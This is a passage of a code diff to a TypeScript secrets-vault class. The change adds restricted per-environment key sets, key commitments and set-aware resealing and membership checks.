     const out: Record<string, Record<string, string>> = {};
-    for (const env of this.envNames()) out[env] = this.materialize(id, env);
+    for (const env of this.envNames()) if (!this.isRestricted(env)) out[env] = this.materialize(id, env);
     return out;
   }
 
+  /** A new vault key, wrapped for every full member, and every open set re-sealed under it. */
   private reseal(plaintext: Record<string, Record<string, string>>): number {
     const dek = newDek();
     const wraps: Record<string, DekWrap> = {};
-    for (const [fp, r] of Object.entries(this.data.recipients)) {
-      wraps[fp] = r.type === "age" || isAgeRecipient(r.pk)
-        ? { age: wrapDekWithAge(dek, r.pk) }
-        : wrapDek(dek, decodePub(r.pk));
-    }
+    for (const [fp, r] of Object.entries(this.data.recipients)) if (!r.sets) wraps[fp] = wrapFor(dek, r);
     const generation = this.data.dek.generation + 1;
-    this.data.dek = { generation, wraps };
+    this.data.dek = { generation, wraps, commit: vaultKeyCommit(dek, this.data.id, generation) };
 
     let count = 0;
     for (const [env, values] of Object.entries(plaintext)) {
       for (const [key, value] of Object.entries(values)) {
-        const prev = this.data.envs[env][key];
-        this.data.envs[env][key] = {
-          ...sealValue(dek, env, key, value, generation),
-          gen: generation,
-          v: 2,
-          updatedAt: prev.updatedAt,
-          updatedBy: prev.updatedBy,
-          ...(prev.note ? { note: prev.note } : {}),
-        };
+        this.data.envs[env][key] = this.sealEntry(dek, env, key, value, this.data.envs[env][key]);
         count++;
       }
     }
@@ -1444,13 +1309,36 @@ export class Vault {
     return count;
   }
 
+  /** A new key for one restricted set, for everyone still wrapped in it. */
+  private resealSet(env: string, values: Record<string, string>): number {
+    const k = this.data.setKeys![env];
+    const key = newDek();
+    const generation = k.generation + 1;
+    const wraps: Record<string, DekWrap> = {};
+    for (const fp of Object.keys(k.wraps)) {
+      const r = this.data.recipients[fp];
+      if (r) wraps[fp] = wrapFor(key, r);
+    }
+    this.data.setKeys![env] = { generation, wraps, commit: setKeyCommit(key, this.data.id, env, generation) };
+    this.setKeyCache.delete(env);
+    this.trustedSets.set(env, { generation, key });
+    let count = 0;
+    for (const [name, value] of Object.entries(values)) {
+      this.data.envs[env][name] = this.sealEntry(key, env, name, value, this.data.envs[env][name]);
+      count++;
+    }
+    return count;
+  }
+
   members(): (Recipient & { fingerprint: string; canDecrypt: boolean; kind: string })[] {
     return Object.entries(this.data.recipients)
       .map(([fp, r]) => ({
         ...r,
         name: safeText(r.name, 64) ?? "unknown",
         fingerprint: fp,
-        canDecrypt: Boolean(this.data.dek.wraps[fp]),
+        canDecrypt: r.sets
+          ? r.sets.some((env) => Boolean(this.data.setKeys?.[env]?.wraps[fp]))
+          : Boolean(this.data.dek.wraps[fp]),
         kind: r.type === "age" || isAgeRecipient(r.pk) ? "age" : "x25519",
       }))
       .sort((a, b) => a.name.localeCompare(b.name));
